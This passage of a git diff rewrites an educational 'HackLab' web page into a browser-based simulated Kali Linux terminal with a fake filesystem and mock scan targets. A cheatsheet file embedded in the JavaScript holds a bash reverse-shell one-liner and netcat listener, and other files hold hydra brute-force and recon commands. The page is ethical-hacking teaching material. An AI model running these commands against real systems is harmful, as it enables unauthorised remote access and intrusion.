-        <div class="brand-sub">White Hat Edu</div>
-      </div>
+<!-- MODAL for vim/nano -->
+<div class="modal" id="modal">
+  <div class="modal-box">
+    <div class="modal-header">
+      <span id="modalTitle">editor</span>
+      <span id="modalHint">Ctrl+S save · Esc close</span>
     </div>
-
-    <div class="nav-label">Navigate</div>
-    <ul class="nav">
-      <li><a href="#home" class="active"><svg viewBox="0 0 24 24"><path d="M3 12l9-9 9 9M5 10v10h14V10"/></svg>Home</a></li>
-      <li><a href="#terminal"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Terminal</a></li>
-      <li><a href="#learn"><svg viewBox="0 0 24 24"><path d="M4 19.5V6a2 2 0 012-2h12v16H6a2 2 0 01-2-2z"/></svg>Learning Paths</a></li>
-      <li><a href="#tools"><svg viewBox="0 0 24 24"><path d="M14.7 6.3a4 4 0 105.4 5.4L21 13l-8 8-2-2 8-8-1.3-1.3z"/></svg>Tools</a></li>
-      <li><a href="#ethics"><svg viewBox="0 0 24 24"><path d="M12 2l3 6 6 1-4.5 4.5L17 20l-5-3-5 3 1.5-6.5L4 9l6-1z"/></svg>Ethics</a></li>
-      <li><a href="#resources"><svg viewBox="0 0 24 24"><path d="M10 13a5 5 0 007 0l3-3a5 5 0 00-7-7l-1 1"/></svg>Resources</a></li>
-    </ul>
-
-    <div class="sidebar-footer">
-      <div><span class="status-dot"></span>Connected · v4.0</div>
-      <div style="margin-top: 0.35rem;">stay curious · stay legal</div>
+    <div class="modal-body">
+      <textarea id="modalText" spellcheck="false"></textarea>
     </div>
-  </aside>
-
-  <div class="overlay" id="overlay"></div>
-
-  <!-- MAIN -->
-  <main class="main">
-    <div class="topbar">
-      <button class="menu-toggle" id="menuToggle" aria-label="Menu">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
-      </button>
-      <div class="breadcrumb">~/hacklab/<strong id="currentSection">home</strong></div>
-      <div class="topbar-actions">
-        <button class="btn" id="soundToggle" title="Toggle sound">🔊 <span>Sound</span></button>
-        <a href="#terminal" class="btn btn-primary">⌨️ <span>Open Shell</span></a>
-      </div>
+    <div class="modal-footer">
+      <span id="modalFile"></span>
+      <span id="modalStatus">ready</span>
     </div>
-
-    <div class="content" id="content">
-
-      <!-- HERO -->
-      <section class="hero" id="home">
-        <div class="badge">White Hat · Legal Labs Only · v4.0</div>
-        <h1>Enter the terminal.<br/>Become the hacker.</h1>
-        <p>Realistic simulated shell, live command playground, matrix rain, achievements — everything you need to learn cybersecurity the right way. 100% legal, 100% awesome.</p>
-        <div class="hero-actions">
-          <a href="#terminal" class="btn btn-primary">▶ Launch Terminal</a>
-          <a href="#learn" class="btn">📚 Browse Paths</a>
-        </div>
-
-        <div class="stats">
-          <div class="stat"><div class="stat-num" data-count="40">0</div><div class="stat-label">Commands</div></div>
-          <div class="stat"><div class="stat-num" data-count="6">0</div><div class="stat-label">Paths</div></div>
-          <div class="stat"><div class="stat-num" data-count="100">0</div><div class="stat-label">% Free</div></div>
-          <div class="stat"><div class="stat-num" data-count="999">0</div><div class="stat-label">Easter Eggs</div></div>
-        </div>
-      </section>
-
-      <!-- TERMINAL -->
-      <section class="block" id="terminal">
-        <div class="section-tag">// 01 · Interactive Shell</div>
-        <h2 class="section-title">HackLab Terminal</h2>
-        <p class="section-desc">Type <code style="color: var(--accent); font-family: 'JetBrains Mono', monospace;">help</code> to begin. Try <code style="color: var(--accent); font-family: 'JetBrains Mono', monospace;">hack</code> or <code style="color: var(--accent); font-family: 'JetBrains Mono', monospace;">targets</code> for easter eggs.</p>
-
-        <div class="terminal-wrap" id="terminalWrap">
-          <div class="term-header">
-            <span class="dot r"></span>
-            <span class="dot y"></span>
-            <span class="dot g"></span>
-            <span class="term-title">kali@hacklab: ~ — simulated shell</span>
-            <div class="term-status">
-              <span class="live">LIVE</span>
-              <span id="cmdCounter">0 cmds</span>
-            </div>
-          </div>
-          <div class="term-body" id="termBody"></div>
-          <div class="term-input-line">
-            <span class="p" id="promptStr"></span>
-            <input id="cmdInput" autocomplete="off" autocapitalize="off" spellcheck="false" placeholder="type 'help'..." autofocus />
-          </div>
-          <div class="term-hints">
-            <span>↑↓ history</span>
-            <span>Tab complete</span>
-            <span>Ctrl+L clear</span>
-            <span>try: hack</span>
-          </div>
-        </div>
-      </section>
-
-      <!-- LEARN -->
-      <section class="block" id="learn">
-        <div class="section-tag">// 02 · Curriculum</div>
-        <h2 class="section-title">Learning Paths</h2>
-        <p class="section-desc">Structured tracks from zero to hero — pick one and go.</p>
-        <div class="grid">
-          <div class="card"><div class="card-icon">🌐</div><h3>Networking</h3><p>TCP/IP, DNS, HTTP, packets — how the internet actually works.</p><span class="pill">Beginner</span></div>
-          <div class="card"><div class="card-icon">🐧</div><h3>Linux Basics</h3><p>Command line, permissions, processes, pipes — the hacker's daily driver.</p><span class="pill">Beginner</span></div>
-          <div class="card"><div class="card-icon">🕸️</div><h3>Web Security</h3><p>OWASP Top 10, XSS, SQLi, CSRF — understand attacks to stop them.</p><span class="pill blue">Intermediate</span></div>
-          <div class="card"><div class="card-icon">🔐</div><h3>Cryptography</h3><p>Hashing, TLS, PKI, symmetric & asymmetric — all explained simply.</p><span class="pill blue">Intermediate</span></div>
-          <div class="card"><div class="card-icon">🎯</div><h3>Penetration Testing</h3><p>Recon → Exploit → Report. The full kill chain, legally.</p><span class="pill purple">Advanced</span></div>
-          <div class="card"><div class="card-icon">🛡️</div><h3>Blue Team</h3><p>Detection, SIEM, incident response, hardening enterprise systems.</p><span class="pill orange">Advanced</span></div>
-        </div>
-      </section>
-
-      <!-- TOOLS -->
-      <section class="block" id="tools">
-        <div class="section-tag">// 03 · Arsenal</div>
-        <h2 class="section-title">Legal Practice Tools</h2>
-        <p class="section-desc">Handpicked platforms to sharpen your skills, 100% legally.</p>
-        <div class="grid">
-          <div class="card"><div class="card-icon">🎮</div><h3>TryHackMe</h3><p>Guided, gamified labs for beginners — perfect first CTF.</p><span class="pill">Guided</span></div>
-          <div class="card"><div class="card-icon">📦</div><h3>Hack The Box</h3><p>Realistic machines to exploit legally. Intermediate-friendly.</p><span class="pill blue">Realistic</span></div>
-          <div class="card"><div class="card-icon">🧃</div><h3>OWASP Juice Shop</h3><p>Deliberately vulnerable web app for modern web exploitation.</p><span class="pill purple">Web</span></div>
-          <div class="card"><div class="card-icon">📡</div><h3>Wireshark</h3><p>Free packet analyzer — see exactly what flows through your network.</p><span class="pill orange">Network</span></div>
-        </div>
-      </section>
-
-      <!-- ETHICS -->
-      <section class="block" id="ethics">
-        <div class="section-tag">// 04 · Code of Conduct</div>
-        <h2 class="section-title">The White Hat Code</h2>
-        <p class="section-desc">Skill without ethics is a weapon. These four rules separate hackers from criminals.</p>
-        <div class="ethics-grid">
-          <div class="ethic"><div class="num">01</div><h4>Permission First</h4><p>Only test what you own or have <strong>written</strong> permission for.</p></div>
-          <div class="ethic"><div class="num">02</div><h4>Do No Harm</h4><p>Never damage, delete, or leak data. Document and report.</p></div>
-          <div class="ethic"><div class="num">03</div><h4>Stay Legal</h4><p>CFAA, CMA, GDPR apply to you. Know them before you act.</p></div>
-          <div class="ethic"><div class="num">04</div><h4>Keep Learning</h4><p>The best hackers are the most curious. Read, lab, repeat.</p></div>
-        </div>
-      </section>
-
-      <!-- RESOURCES -->
-      <section class="block" id="resources">
-        <div class="section-tag">// 05 · Vault</div>
-        <h2 class="section-title">Free Resources</h2>
-        <p class="section-desc">Curated links to legit training platforms.</p>
-        <div class="resource-grid">
-          <a class="resource" href="https://tryhackme.com" target="_blank" rel="noopener">TryHackMe <span class="arrow">→</span></a>
-          <a class="resource" href="https://www.hackthebox.com" target="_blank" rel="noopener">Hack The Box <span class="arrow">→</span></a>
-          <a class="resource" href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">OWASP Top 10 <span class="arrow">→</span></a>
-          <a class="resource" href="https://www.wireshark.org" target="_blank" rel="noopener">Wireshark <span class="arrow">→</span></a>
-          <a class="resource" href="https://www.kali.org" target="_blank" rel="noopener">Kali Linux <span class="arrow">→</span></a>
-          <a class="resource" href="https://overthewire.org/wargames/" target="_blank" rel="noopener">OverTheWire <span class="arrow">→</span></a>
-          <a class="resource" href="https://picoctf.org" target="_blank" rel="noopener">picoCTF <span class="arrow">→</span></a>
-          <a class="resource" href="https://portswigger.net/web-security" target="_blank" rel="noopener">PortSwigger <span class="arrow">→</span></a>
-        </div>
-      </section>
-
-    </div>
-  </main>
+  </div>
 </div>
 
 <script>
-/* ========================================================
-   HACKLAB ULTIMATE v4 — Javascript
-   ======================================================== */
+/* ============================================================
+   HACKLAB v5 — Full Linux Terminal Simulator
+   Educational only. No real network or OS access.
+   ============================================================ */
 
-/* ============ BOOT SEQUENCE ============ */
-(function bootSequence() {
-  const bootEl = document.getElementById('boot');
-  const textEl = document.getElementById('bootText');
+const term = document.getElementById('term');
+const input = document.getElementById('cmd');
+const promptEl = document.getElementById('prompt');
+const windowTitle = document.getElementById('windowTitle');
+const sbUser = document.getElementById('sbUser');
+const sbPath = document.getElementById('sbPath');
+const sbCmds = document.getElementById('sbCmds');
+const sbClock = document.getElementById('sbClock');
+const themeSelect = document.getElementById('themeSelect');
+const modal = document.getElementById('modal');
+const modalText = document.getElementById('modalText');
+const modalTitle = document.getElementById('modalTitle');
+const modalFile = document.getElementById('modalFile');
 
-  const lines = [
-    { t: "[ OK ] Initializing HackLab kernel v4.0...", d: 200 },
-    { t: "[ OK ] Loading cryptographic modules...", d: 180 },
-    { t: "[ OK ] Mounting virtual filesystem...", d: 150 },
-    { t: "[ OK ] Starting matrix rain daemon...", d: 220 },
-    { t: "[ OK ] Loading 40+ simulated shell commands...", d: 250 },
-    { t: "[ OK ] Bypassing firewalls (jk, we're white hats)...", d: 280 },
-    { t: "", d: 150 },
-    { t: "       ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗      █████╗ ██████╗ ", d: 40 },
-    { t: "       ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║     ██╔══██╗██╔══██╗", d: 40 },
-    { t: "       ███████║███████║██║     █████╔╝ ██║     ███████║██████╔╝", d: 40 },
-    { t: "       ██╔══██║██╔══██║██║     ██╔═██╗ ██║     ██╔══██║██╔══██╗", d: 40 },
-    { t: "       ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║██████╔╝", d: 40 },
-    { t: "       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ", d: 40 },
-    { t: "", d: 200 },
-    { t: "       Welcome, future white hat. Booting shell...", d: 300 },
-    { t: "", d: 400 }
-  ];
+/* ============================================================
+   STATE — persisted to localStorage
+   ============================================================ */
+const DEFAULT_STATE = {
+  cwd: '/home/kali',
+  user: 'kali',
+  host: 'hacklab',
+  isRoot: false,
+  cmdCount: 0,
+  history: [],
+  alias: {},
+  theme: 'default',
+  customFiles: {}, // files created by user via touch/echo >/nano
+  customDirs: {},  // dirs created via mkdir
+  installedPackages: ['nmap', 'curl', 'git', 'vim', 'nano']
+};
 
-  let i = 0;
-  let buffer = '';
-  function next() {
-    if (i >= lines.length) {
-      setTimeout(() => {
-        bootEl.classList.add('hide');
-        setTimeout(() => bootEl.remove(), 700);
-      }, 300);
-      return;
-    }
-    const line = lines[i++];
-    buffer += line.t + '\n';
-    textEl.innerHTML = buffer.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '<span class="boot-cursor"></span>';
-    setTimeout(next, line.d);
+let state = loadState();
+function loadState() {
+  try {
+    const raw = localStorage.getItem('hacklab_v5_state');
+    if (raw) return { ...DEFAULT_STATE, ...JSON.parse(raw) };
+  } catch {}
+  return { ...DEFAULT_STATE };
+}
+function saveState() {
+  try { localStorage.setItem('hacklab_v5_state', JSON.stringify(state)); } catch {}
+}
+
+/* ============================================================
+   VIRTUAL FILESYSTEM — combined static + custom
+   ============================================================ */
+const BASE_FS = {
+  '/':                        ['bin', 'boot', 'dev', 'etc', 'home', 'opt', 'proc', 'root', 'sbin', 'tmp', 'usr', 'var'],
+  '/home':                    ['kali'],
+  '/home/kali':               ['Documents', 'Downloads', 'loot', 'Projects', '.bashrc', '.zshrc', 'notes.txt', 'scan.sh', 'wordlist.txt', 'README.md'],
+  '/home/kali/Documents':     ['cheatsheet.md', 'methodology.pdf', 'TODO.txt'],
+  '/home/kali/Downloads':     ['rockyou.txt.gz', 'linpeas.sh', 'winpeas.exe', 'payload.bin'],
+  '/home/kali/loot':          ['.keep', 'hashes.txt'],
+  '/home/kali/Projects':      ['exploit.py', 'recon.sh', 'report.md'],
+  '/bin':                     ['bash', 'cat', 'ls', 'cp', 'mv', 'rm', 'echo', 'grep', 'sed', 'awk', 'curl', 'wget'],
+  '/etc':                     ['passwd', 'shadow', 'hosts', 'hostname', 'os-release', 'resolv.conf', 'sudoers'],
+  '/etc/ssh':                 ['sshd_config'],
+  '/var':                     ['log', 'www', 'tmp'],
+  '/var/log':                 ['auth.log', 'syslog', 'kern.log', 'dpkg.log'],
+  '/var/www':                 ['html'],
+  '/var/www/html':            ['index.html'],
+  '/tmp':                     [],
+  '/usr':                     ['bin', 'local', 'share'],
+  '/usr/bin':                 ['python3', 'gcc', 'make', 'nmap', 'nc', 'ssh', 'vim', 'nano', 'git', 'curl'],
+  '/usr/local':               ['bin'],
+  '/root':                    ['.bash_history', 'root.txt'],
+  '/opt':                     ['tools'],
+  '/opt/tools':               ['nmap', 'gobuster', 'ffuf', 'hydra', 'sqlmap'],
+  '/proc':                    ['version', 'cpuinfo', 'meminfo'],
+  '/dev':                     ['null', 'random', 'sda'],
+  '/boot':                    ['vmlinuz', 'initrd.img'],
+  '/sbin':                    ['ifconfig', 'iptables', 'reboot']
+};
+
+const BASE_FILE_CONTENT = {
+  '/home/kali/notes.txt':
+`# HTB / TryHackMe Methodology
+=====================================
+1. nmap -sV -sC -p- <IP>          # full port scan
+2. Add vhosts to /etc/hosts
+3. gobuster dir -u http://<IP> -w wordlist.txt
+4. nikto -h <IP>                   # web vuln scan
+5. enum4linux -a <IP>              # SMB enum
+6. Check: /admin, /backup, .git, robots.txt, sitemap.xml
+7. STOP. THINK. ENUMERATE MORE.
+
+Remember:
+- The box is not always the exploit. The box is the methodology.
+- Default creds > 60% of easy HTB.
+- Google the service version + "exploit".`,
+
+  '/home/kali/README.md':
+`# Welcome to HackLab v5
+
+This is a **simulated** Linux environment.
+Nothing here touches your real system or any network.
+
+## Commands to try
+  help          - list all commands
+  neofetch      - system info
+  htop          - process viewer
+  tree          - directory tree
+  nmap 10.10.10.5
+  gobuster dir -u http://10.10.10.5 -w wordlist.txt
+  cat notes.txt
+  sudo su       - become root (password: toor)
+
+## Easter eggs
+  hack  matrix  party  coffee  sl  cowsay  fortune  figlet`,
+
+  '/home/kali/Documents/cheatsheet.md':
+`# Quick Cheatsheet
+## Recon
+nmap -sV -sC -p- <target>
+## Web
+gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
+nikto -h http://<target>
+ffuf -u http://<target>/FUZZ -w wordlist.txt
+## SMB
+enum4linux -a <target>
+smbclient -L //<target>
+## Shells
+nc -lvnp 4444
+bash -i >& /dev/tcp/<your_ip>/4444 0>&1
+## Password Attacks (LAB ONLY)
+hydra -l admin -P rockyou.txt ssh://<target>`,
+
+  '/home/kali/Documents/TODO.txt':
+`[x] Set up Kali VM
+[x] Complete TryHackMe Intro room
+[x] Learn nmap basics
+[ ] Root my first HTB box
+[ ] Learn Burp Suite
+[ ] Study OWASP Top 10
+[ ] Earn eJPT certification
+[ ] Never break the law`,
+
+  '/home/kali/loot/hashes.txt':
+`admin:$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
+root:$6$rounds=656000$abc123$xyz...
+user:$1$xyz$abcdefghijklmnopqrstuv`,
+
+  '/etc/passwd':
+`root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+kali:x:1000:1000:Kali User,,,:/home/kali:/bin/bash`,
+
+  '/etc/hosts':
+`127.0.0.1       localhost
+127.0.1.1       hacklab
+# Add HTB targets below:
+# 10.10.10.5    target.htb`,
+
+  '/etc/os-release':
+`NAME="Kali GNU/Linux"
+VERSION="2025.2"
+ID=kali
+PRETTY_NAME="Kali GNU/Linux Rolling"
+VERSION_ID="2025.2"
+HOME_URL="https://www.kali.org/"
+SUPPORT_URL="https://forums.kali.org/"
+BUG_REPORT_URL="https://bugs.kali.org/"`,
+
+  '/etc/resolv.conf':
+`nameserver 1.1.1.1
+nameserver 8.8.8.8
+# Cloudflare + Google DNS`,
+
+  '/home/kali/.bashrc':
+`# ~/.bashrc
+export PS1='\\u@\\h:\\w\\$ '
+alias ll='ls -la'
+alias la='ls -A'
+alias l='ls -CF'
+alias grep='grep --color=auto'
+# add your own:`,
+
+  '/home/kali/wordlist.txt':
+`admin
+password
+letmein
+root
+123456
+qwerty
+changeme
+hacker
+guest
+test
+administrator
+welcome
+monkey
+dragon
+master
+sunshine
+princess
+football
+baseball
+iloveyou`,
+
+  '/home/kali/scan.sh':
+`#!/bin/bash
+# Quick recon script
+TARGET=$1
+if [ -z "$TARGET" ]; then
+  echo "Usage: ./scan.sh <IP>"
+  exit 1
+fi
+echo "[*] Starting scan on $TARGET"
+nmap -sV -sC -p- $TARGET -oN scan_$TARGET.txt
+echo "[*] Scanning web dirs..."
+gobuster dir -u http://$TARGET -w wordlist.txt -o gobuster_$TARGET.txt
+echo "[*] Done. Check scan_$TARGET.txt"`,
+
+  '/home/kali/Projects/recon.sh':
+`#!/bin/bash
+# Full recon automation
+TARGET=$1
+mkdir -p recon_$TARGET
+cd recon_$TARGET
+nmap -sV -sC -p- $TARGET -oA nmap_full
+gobuster dir -u http://$TARGET -w ../wordlist.txt -o gobuster.txt
+nikto -h http://$TARGET -o nikto.txt
+echo "Recon complete for $TARGET"`,
+
+  '/home/kali/Projects/report.md':
+`# Penetration Test Report — Template
+
+## Executive Summary
+...
+
+## Findings
+### 1. [High] SQL Injection in /login
+**CVSS:** 8.6
+**Steps:** ...
+**Impact:** ...
+**Fix:** Use parameterized queries.
+
+## Appendix
+Raw scan output attached.`,
+
+  '/root/root.txt':
+`HTB{th1s_1s_y0ur_r00t_fl4g_c0ngr4ts}
+
+You did it. Now go do it legally on Hack The Box. 💚`,
+
+  '/var/log/auth.log':
+`Jan  5 14:22:01 hacklab sshd[1234]: Failed password for root from 10.0.0.5 port 40221 ssh2
+Jan  5 14:22:03 hacklab sshd[1234]: Failed password for root from 10.0.0.5 port 40223 ssh2
+Jan  5 14:22:05 hacklab sshd[1234]: Failed password for root from 10.0.0.5 port 40225 ssh2
+Jan  5 14:22:07 hacklab sshd[1234]: Failed password for root from 10.0.0.5 port 40227 ssh2
+Jan  5 14:22:09 hacklab sshd[1234]: Accepted password for kali from 127.0.0.1 port 51234 ssh2
+Jan  5 14:22:10 hacklab sudo:   kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/bin/bash`,
+
+  '/var/log/syslog':
+`Jan  5 14:20:01 hacklab systemd[1]: Started Update UTMP about System Runlevel Changes.
+Jan  5 14:20:15 hacklab NetworkManager[890]: <info> device (eth0): state change: activated
+Jan  5 14:22:00 hacklab cron[1234]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)`,
+
+  '/proc/version':
+`Linux version 6.5.0-kali3-amd64 (devel@kali.org) (gcc-12) #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1`,
+
+  '/proc/cpuinfo':
+`processor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 158
+model name	: Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz
+cpu MHz		: 2592.000
+cache size	: 12288 KB
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr`,
+
+  '/proc/meminfo':
+`MemTotal:       16384000 kB
+MemFree:         8192000 kB
+MemAvailable:   12288000 kB
+Buffers:          512000 kB
+Cached:          3072000 kB
+SwapTotal:       2048000 kB`,
+
+  '/var/www/html/index.html':
+`<!DOCTYPE html>
+<html>
+  <head><title>Welcome</title></head>
+  <body>
+    <h1>It works!</h1>
+    <p>Apache default page.</p>
+  </body>
+</html>`,
+
+  '/etc/sudoers':
+`Defaults        env_reset
+root    ALL=(ALL:ALL) ALL
+%sudo   ALL=(ALL:ALL) ALL
+kali    ALL=(ALL:ALL) NOPASSWD: /usr/bin/nmap, /usr/bin/tcpdump`,
+
+  '/etc/ssh/sshd_config':
+`Port 22
+PermitRootLogin no
+PasswordAuthentication yes
+PubkeyAuthentication yes
+X11Forwarding yes`
+};
+
+/* ============================================================
+   FILESYSTEM — merges base + user-created
+   ============================================================ */
+function getFS() {
+  const fs = {};
+  for (const [k, v] of Object.entries(BASE_FS)) fs[k] = [...v];
+  // add custom dirs
+  for (const d of Object.keys(state.customDirs)) {
+    if (!fs[d]) fs[d] = [];
   }
-  setTimeout(next, 300);
-})();
-
-/* ============ MATRIX RAIN ============ */
-(function matrixRain() {
-  const canvas = document.getElementById('matrix');
-  const ctx = canvas.getContext('2d');
-  let w, h, cols, drops;
-
-  function resize() {
-    w = canvas.width = window.innerWidth;
-    h = canvas.height = window.innerHeight;
-    cols = Math.floor(w / 16);
-    drops = Array(cols).fill(1);
+  // add custom files to their dirs
+  for (const f of Object.keys(state.customFiles)) {
+    const dir = dirOf(f);
+    if (!fs[dir]) fs[dir] = [];
+    if (!fs[dir].includes(baseOf(f))) fs[dir].push(baseOf(f));
   }
-  resize();
-  window.addEventListener('resize', resize);
+  return fs;
+}
 
-  const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノ$#@%&*+=<>{}[]()";
+function getFileContent(path) {
+  if (state.customFiles[path] !== undefined) return state.customFiles[path];
+  return BASE_FILE_CONTENT[path] || null;
+}
+function fileExists(path) { return getFileContent(path) !== null; }
+function dirExists(path) {
+  const fs = getFS();
+  return !!fs[path];
+}
+function isDir(path) { return dirExists(path); }
+function isFile(path) { return fileExists(path) && !dirExists(path); }
+function dirOf(p) { return p.substring(0, p.lastIndexOf('/')) || '/'; }
+function baseOf(p) { return p.substring(p.lastIndexOf('/') + 1); }
 
-  function draw() {
-    ctx.fillStyle = "rgba(3, 6, 10, 0.08)";
-    ctx.fillRect(0, 0, w, h);
-    ctx.fillStyle = "#2dd4bf";
-    ctx.font = "14px JetBrains Mono, monospace";
-    for (let i = 0; i < drops.length; i++) {
-      const ch = chars[Math.floor(Math.random() * chars.length)];
-      ctx.fillText(ch, i * 16, drops[i] * 16);
-      if (drops[i] * 16 > h && Math.random() > 0.975) drops[i] = 0;
-      drops[i]++;
-    }
+/* ============================================================
+   NETWORK TARGETS (simulated)
+   ============================================================ */
+const targets = {
+  '10.10.10.5': {
+    host: 'target.htb',
+    os: 'Linux 5.4 (Ubuntu)',
+    ports: [
+      { port: 22,   svc: 'ssh',   ver: 'OpenSSH 8.2p1 Ubuntu 4ubuntu0.5' },
+      { port: 80,   svc: 'http',  ver: 'Apache httpd 2.4.41 ((Ubuntu))' },
+      { port: 443,  svc: 'https', ver: 'Apache httpd 2.4.41' },
+      { port: 3306, svc: 'mysql', ver: 'MySQL 8.0.27-0ubuntu0.20.04.1' }
+    ]
+  },
+  '10.10.10.6': {
+    host: 'box2.htb',
+    os: 'Linux 5.10 (Debian)',
+    ports: [
+      { port: 21,   svc: 'ftp',   ver: 'vsftpd 3.0.3' },
+      { port: 22,   svc: 'ssh',   ver: 'OpenSSH 7.9p1 Debian' },
+      { port: 445,  svc: 'smb',   ver: 'Samba smbd 4.13.17' },
+      { port: 8080, svc: 'http',  ver: 'nginx 1.18.0' }
+    ]
+  },
+  '10.10.10.7': {
+    host: 'dc01.htb',
+    os: 'Windows Server 2019',
+    ports: [
+      { port: 88,   svc: 'kerberos', ver: 'Microsoft Windows Kerberos' },
+      { port: 389,  svc: 'ldap',     ver: 'Microsoft Windows AD LDAP' },
+      { port: 445,  svc: 'smb',      ver: 'Microsoft Windows SMB' },
+      { port: 5985, svc: 'winrm',    ver: 'Microsoft HTTPAPI 2.0' }
+    ]
   }
-  setInterval(draw, 55);
-})();
+};
 
-/* ============ SOUND (Web Audio) ============ */
+/* ============================================================
+   HELPERS
+   ============================================================ */
+function escape(s) {
+  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+function write(html) {
+  const line = document.createElement('div');
+  line.className = 'line';
+  line.innerHTML = html;
+  term.appendChild(line);
+  term.scrollTop = term.scrollHeight;
+}
+function writeText(text, cls = 'c-text') { write(`<span class="${cls}">${escape(text)}</span>`); }
+function writeRaw(html) { write(html); }
+function colorize(text, cls) { return `<span class="${cls}">${escape(text)}</span>`; }
+
+function promptStr() {
+  const p = state.cwd === '/home/' + state.user
+    ? '~'
+    : state.cwd.startsWith('/home/' + state.user + '/')
+      ? '~' + state.cwd.slice(('/home/' + state.user).length)
+      : state.cwd;
+  const userCls = state.isRoot ? 'p-root-user' : 'p-user';
+  const symCls = state.isRoot ? 'p-root-sym' : 'p-sym';
+  const sym = state.isRoot ? '#' : '$';
+  return `<span class="${userCls}">${state.user}</span><span class="${symCls}">@</span><span class="p-host">${state.host}</span><span class="${symCls}">:</span><span class="p-path">${p}</span><span class="${symCls}">${sym}</span>`;
+}
+function updatePrompt() {
+  promptEl.innerHTML = promptStr();
+  sbUser.textContent = state.user + '@' + state.host;
+  sbPath.textContent = state.cwd;
+  windowTitle.textContent = state.user + '@' + state.host + ': ' + (state.cwd === '/home/' + state.user ? '~' : state.cwd) + ' — bash — HackLab v5';
+  document.body.className = 'theme-' + state.theme;
+}
+function updateCmdCount() { sbCmds.textContent = state.cmdCount + ' cmds'; }
+
+function resolvePath(p, base = state.cwd) {
+  if (!p || p === '~') return '/home/' + state.user;
+  if (p.startsWith('~/')) return '/home/' + state.user + p.slice(1);
+  if (p.startsWith('/')) return normalize(p);
+  return normalize(base + '/' + p);
+}
+function normalize(p) {
+  const parts = p.split('/');
+  const out = [];
+  for (const part of parts) {
+    if (!part || part === '.') continue;
+    if (part === '..') out.pop();
+    else out.push(part);
+  }
+  return '/' + out.join('/');
+}
+
+/* ============================================================
+   SOUND
+   ============================================================ */
 let soundOn = true;
 let audioCtx;
-function beep(freq = 800, dur = 0.05, type = 'square', vol = 0.04) {
+function beep(freq = 800, dur = 0.04, type = 'square', vol = 0.03) {
   if (!soundOn) return;
   try {
     if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -995,327 +883,856 @@ function beep(freq = 800, dur = 0.05, type = 'square', vol = 0.04) {
     gain.connect(audioCtx.destination);
     osc.start();
     osc.stop(audioCtx.currentTime + dur);
-  } catch (e) {}
+  } catch {}
 }
 
-document.getElementById('soundToggle').addEventListener('click', (e) => {
-  soundOn = !soundOn;
-  e.currentTarget.innerHTML = (soundOn ? '🔊' : '🔇') + ' <span>Sound</span>';
-  beep(soundOn ? 1200 : 400, 0.08);
-});
+/* ============================================================
+   AUTOCOMPLETE
+   ============================================================ */
+const allCommands = {};
+let autocompleteEl = null;
+let autocompleteIdx = 0;
+let autocompleteMatches = [];
 
-/* ============ SIDEBAR ============ */
-const sidebar = document.getElementById('sidebar');
-const overlay = document.getElementById('overlay');
-const menuToggle = document.getElementById('menuToggle');
-menuToggle.addEventListener('click', () => {
-  sidebar.classList.toggle('open');
-  overlay.classList.toggle('show');
-  beep(600, 0.04);
-});
-overlay.addEventListener('click', () => {
-  sidebar.classList.remove('open');
-  overlay.classList.remove('show');
-});
-document.querySelectorAll('.nav a').forEach(a => a.addEventListener('click', () => {
-  beep(900, 0.03);
-  if (window.innerWidth <= 900) {
-    sidebar.classList.remove('open');
-    overlay.classList.remove('show');
-  }
-}));
+function buildAutocomplete() {
+  autocompleteEl = document.createElement('div');
+  autocompleteEl.className = 'autocomplete';
+  document.querySelector('.term-wrap').appendChild(autocompleteEl);
+}
 
-/* ============ SECTION TRACKING ============ */
-const sections = document.querySelectorAll('section[id]');
-const navLinks = document.querySelectorAll('.nav a');
-const currentSection = document.getElementById('currentSection');
-const observer = new IntersectionObserver((entries) => {
-  entries.forEach(entry => {
-    if (entry.isIntersecting) {
-      const id = entry.target.id;
-      navLinks.forEach(link => link.classList.toggle('active', link.getAttribute('href') === '#' + id));
-      if (currentSection) currentSection.textContent = id;
-    }
-  });
-}, { rootMargin: '-40% 0px -55% 0px' });
-sections.forEach(s => observer.observe(s));
-
-/* ============ STAT COUNTERS ============ */
-function animateCounters() {
-  document.querySelectorAll('[data-count]').forEach(el => {
-    const target = +el.dataset.count;
-    let current = 0;
-    const step = target / 50;
-    const iv = setInterval(() => {
-      current += step;
-      if (current >= target) {
-        current = target;
-        clearInterval(iv);
-        el.textContent = target === 999 ? '∞' : target + '+';
-      } else {
-        el.textContent = Math.floor(current);
-      }
-    }, 25);
+function showAutocomplete(matches, prefix) {
+  if (!matches.length) { hideAutocomplete(); return; }
+  autocompleteMatches = matches;
+  autocompleteIdx = 0;
+  autocompleteEl.innerHTML = matches.map((m, i) =>
+    `<div class="item${i === 0 ? ' active' : ''}" data-idx="${i}">${escape(m)}</div>`
+  ).join('');
+  autocompleteEl.classList.add('show');
+  autocompleteEl.querySelectorAll('.item').forEach(el => {
+    el.addEventListener('click', () => {
+      applyCompletion(matches[+el.dataset.idx]);
